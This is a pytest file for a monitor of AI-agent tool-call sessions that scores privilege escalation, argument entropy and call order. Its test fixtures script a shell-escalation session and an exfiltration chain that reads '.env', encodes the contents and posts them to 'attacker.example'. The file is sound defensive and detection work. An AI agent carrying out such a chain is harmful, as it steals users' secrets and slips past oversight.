"""
Phase 3 tests: feature engineering correctness.

Uses core.telemetry.TelemetryStore directly to log synthetic sessions —
no live MCP server needed, since features.py only cares about the
tool_calls rows, not how they got there.

Run:
    pytest tests/test_features.py -v
"""

from __future__ import annotations

from core.telemetry import TelemetryStore, get_session_calls
from core.features import extract_session_features, _shannon_entropy
from core.privilege import privilege_of, PrivilegeLevel


def _log_session(tmp_path, agent_id: str, calls: list[tuple[str, dict]]) -> tuple[str, object]:
    """Helper: log a synthetic sequence of (tool_name, arguments) calls and return
    (session_id, db_path) so the test can read features back."""
    db_path = tmp_path / f"{agent_id}.db"
    store = TelemetryStore(agent_id=agent_id, db_path=db_path)
    for tool_name, arguments in calls:
        store.log_call(
            tool_name=tool_name,
            arguments=arguments,
            duration_ms=5.0,
            is_error=False,
            result_summary="ok",
        )
    store.end_session()
    return store.session_id, db_path


def test_privilege_registry_known_and_unknown_tools():
    assert privilege_of("read_file") == PrivilegeLevel.READ
    assert privilege_of("shell_execute") == PrivilegeLevel.EXECUTE
    # unknown tool defaults conservatively high, not to READ
    assert privilege_of("some_totally_new_tool") == PrivilegeLevel.NETWORK


def test_shannon_entropy_plain_text_lower_than_random_blob():
    plain = "notes.txt"
    # base64 of genuinely random bytes — representative of encoded/exfiltrated data.
    # (An earlier version of this test used a hand-written "base64-looking" string
    # that was heavily padded with repeated 'A'/'0' characters and actually scored
    # LOWER entropy than plain text — caught by actually running this test, not by
    # inspection. Real random-byte base64 is what encoded exfil payloads look like.)
    blob = "KzXm0Hjzena89wQWsRW1VrODAlFTXkCHBfzxWOEgMiU="
    assert _shannon_entropy(plain) < _shannon_entropy(blob)


def test_shannon_entropy_empty_string_is_zero():
    assert _shannon_entropy("") == 0.0


def test_benign_session_has_zero_escalation_distance(tmp_path):
    session_id, db_path = _log_session(
        tmp_path,
        "test-benign",
        [
            ("read_file", {"path": "notes.txt"}),
            ("search_code", {"query": "TODO"}),
            ("report", {"summary": "done"}),
        ],
    )
    rows = get_session_calls(session_id, db_path=db_path)
    features = extract_session_features(session_id, rows)

    assert features.call_count == 3
    assert features.privilege_escalation_distance == 0
    assert features.max_privilege_level == PrivilegeLevel.READ
    assert features.error_rate == 0.0


def test_privilege_escalation_attack_is_detected(tmp_path):
    """Normal read-only work, then a sudden jump to EXECUTE — must register max distance."""
    session_id, db_path = _log_session(
        tmp_path,
        "test-privesc",
        [
            ("read_file", {"path": "notes.txt"}),
            ("search_code", {"query": "TODO"}),
            ("shell_execute", {"command": "whoami"}),
        ],
    )
    rows = get_session_calls(session_id, db_path=db_path)
    features = extract_session_features(session_id, rows)

    assert features.max_privilege_level == PrivilegeLevel.EXECUTE
    # READ (1) -> EXECUTE (4) => distance of 3, the max jump in the session
    assert features.privilege_escalation_distance == 3
    assert features.start_privilege_level == PrivilegeLevel.READ
    assert features.end_privilege_level == PrivilegeLevel.EXECUTE


def test_escalation_distance_uses_max_jump_not_just_last_step(tmp_path):
    """A late de-escalation shouldn't hide an earlier spike — distance is the max jump anywhere."""
    session_id, db_path = _log_session(
        tmp_path,
        "test-spike-then-cooldown",
        [
            ("read_file", {"path": "notes.txt"}),      # READ (1)
            ("shell_execute", {"command": "id"}),        # EXECUTE (4) <- spike
            ("read_file", {"path": "notes.txt"}),        # back to READ (1)
        ],
    )
    rows = get_session_calls(session_id, db_path=db_path)
    features = extract_session_features(session_id, rows)
    assert features.privilege_escalation_distance == 3  # still catches the mid-session spike


def test_exfiltration_chain_shows_rising_entropy_on_transform_step(tmp_path):
    """Sensitive read -> transform (encode) -> network, per the documented attack-chain pattern.
    The encode step's argument entropy should be visibly higher than the initial read's."""
    session_id, db_path = _log_session(
        tmp_path,
        "test-exfil-chain",
        [
            ("read_file", {"path": ".env"}),
            ("encode_data", {"payload": "KzXm0Hjzena89wQWsRW1VrODAlFTXkCHBfzxWOEgMiU="}),
            ("http_request", {"url": "https://attacker.example/collect"}),
        ],
    )
    rows = get_session_calls(session_id, db_path=db_path)
    features = extract_session_features(session_id, rows)

    read_entropy = _shannon_entropy(".env")
    assert features.max_argument_entropy > read_entropy
    assert features.max_privilege_level == PrivilegeLevel.NETWORK
    assert features.privilege_escalation_distance == 2  # READ(1) -> NETWORK(3)


def test_unknown_tool_defaults_to_elevated_privilege_not_lowest(tmp_path):
    """A tool absent from the registry must not be treated as harmless by default —
    otherwise an attacker (or rug-pulled server) evades escalation-distance scoring
    just by using an unregistered tool name."""
    session_id, db_path = _log_session(
        tmp_path,
        "test-unknown-tool",
        [
            ("read_file", {"path": "notes.txt"}),
            ("some_brand_new_mystery_tool", {"x": "y"}),
        ],
    )
    rows = get_session_calls(session_id, db_path=db_path)
    features = extract_session_features(session_id, rows)
    assert features.max_privilege_level == PrivilegeLevel.NETWORK  # conservative default


def test_bigrams_capture_call_order():
    from core.features import extract_session_features
    rows = [
        {"tool_name": "read_file", "arguments_json": "{}", "called_at": 1.0, "duration_ms": 1, "is_error": 0, "sequence_num": 1},
        {"tool_name": "search_code", "arguments_json": "{}", "called_at": 2.0, "duration_ms": 1, "is_error": 0, "sequence_num": 2},
        {"tool_name": "report", "arguments_json": "{}", "called_at": 3.0, "duration_ms": 1, "is_error": 0, "sequence_num": 3},
    ]
    features = extract_session_features("synthetic", rows)
    assert features.bigrams[("read_file", "search_code")] == 1
    assert features.bigrams[("search_code", "report")] == 1


def test_to_vector_returns_only_numeric_fields():
    rows = [
        {"tool_name": "read_file", "arguments_json": '{"path": "notes.txt"}', "called_at": 1.0, "duration_ms": 1, "is_error": 0, "sequence_num": 1},
    ]
    features = extract_session_features("synthetic", rows)
    vector = features.to_vector()
    assert all(isinstance(v, float) for v in vector.values())
    assert "session_id" not in vector
    assert "tool_sequence" not in vector
